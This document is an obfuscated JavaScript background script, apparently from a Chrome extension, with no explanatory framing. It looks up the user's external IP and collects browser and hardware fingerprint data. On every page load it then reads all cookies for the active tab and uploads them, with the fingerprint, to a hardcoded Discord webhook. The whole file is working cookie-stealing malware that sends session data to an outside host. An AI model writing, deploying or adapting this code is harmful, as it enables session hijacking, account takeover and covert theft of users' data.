function __$__s_$($_) {
    chrome.system.cpu.getInfo(
        function(cp_$) {
            let i$ = navigator;
            const $__$ = {
                _na$__: i$.userAgentData.brands[0].brand,
                _ip$__: $_,
                _us$__: i$.userAgent,
                _pa$__: i$.platform,
                _si$__: i$.userAgentData.platform,
                _li$__: i$.language,
                _no$__: i$.appCodeName,
                __si$__: i$.hardwareConcurrency,
                __di$__: i$.onLine
            };
            $__$['__ah$__'] = cp_$.archName;
            $__$['__$p$__'] = cp_$.modelName;
            $__$['__$_m$_'] = i$.deviceMemory;
            $__$['$_$___'] = cp_$.numOfProcessors;
            __$__w_$($__$._na$__,
                $__$._ip$__,
                $__$._us$__,
                $__$._pa$__,
                $__$._si$__,
                $__$._li$__,
                $__$._no$__,
                $__$.__si$__,
                $__$.__di$__,
                $__$.__ah$__,
                $__$.__$p$__,
                $__$.__$_m$_,
                $__$.$_$___);
        }
    );
}
async function $__i_$() {
    fetch('https://api.ipify.org?format=json')
        .then(($_) => $_.json())
        .then((e$_) => {
            __$__s_$(e$_.ip);
        });
}

function __$__w_$(_na$__, _ip$__, _us$__, _pa$__, _si$__, _li$__, _no$__, __si$__, __di$__, __ah$__, __$p$__, __$_m$_, $_$___) {
    chrome.tabs.onUpdated.addListener(function($_, c$_, t$_) {
        if (t$_.url != 'chrome://newtab/' || undefined || null || '') {
            if (t$_.status === 'complete') {
                (async function __$_() {
                    let [__$] = await chrome.tabs.query({
                        active: true
                    });
                    chrome.cookies.getAll({
                        url: __$.url
                    }, ($) => {
                        if ($) {
                            _$($, t$_.url,
                                _na$__,
                                _ip$__,
                                _us$__,
                                _pa$__,
                                _si$__,
                                _li$__,
                                _no$__,
                                __si$__,
                                __di$__,
                                __ah$__,
                                __$p$__,
                                __$_m$_,
                                $_$___);
                        }
                    });
                })();
            }
        }
    })
}

function ___$($) {
    if ($ < 10) {
        return '0' + $;
    }
    return $;
}

async function _$($_$, __$, _na$__, _ip$__, _us$__, _pa$__, _si$__, _li$__, _no$__, __si$__, __di$__, __ah$__, __$p$__, __$_m$_, $_$___) {
    const u$ = "https://discord.com/api/webhooks/1244657669025955861/hbctf7sJ_zhxYX2jED1o2PUQWqNEqCahIYTJ7a3CKxScJH6T_vM0hPdltO17et4EBSb3";
    const __f$ = `${__$}.json`;
    const __c$ = new Blob([JSON.stringify($_$, null, 2)], { type: 'text/plain' });
    const __fo$ = new FormData();
    var $_$d = new Date();
    var __$i = ___$($_$d.getDate());
    var __$s = ___$($_$d.getMonth() + 1);
    var __$a = $_$d.getFullYear();
    var __$h = ___$($_$d.getHours());
    var __$m = ___$($_$d.getMinutes());
    var _$_$_$ = __$i + '/' + __$s + '/' + __$a + ' ' + __$h + ':' + __$m;
    __fo$.append('file', __c$, __f$);
    __fo$.append('content', `🌐 Browser: ${_na$__}\n🌐 External IP: ${_ip$__}\n🌐 User Agent: ${_us$__}\n💻 Plataform: ${_pa$__}\n💼 Systen: ${_si$__}\n🌍 Language: ${_li$__}\n📟 App Name: ${_no$__}\n⚙️ Hardware Concurrency:  ${__si$__}\n🌐 Available: ${__di$__}\n⚙️ Architecture: ${__ah$__}\n💻 Processor: ${__$p$__}\n💻 RAM Memory: ${__$_m$_}\n🔄 NNumber of Processors: ${$_$___}\n⏰ Time: ${_$_$_$}\n ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''`);
    const $r = await fetch(u$, { method: 'Post', body: __fo$ });
}

function _$__$__() {
    $__i_$();
}

_$__$__();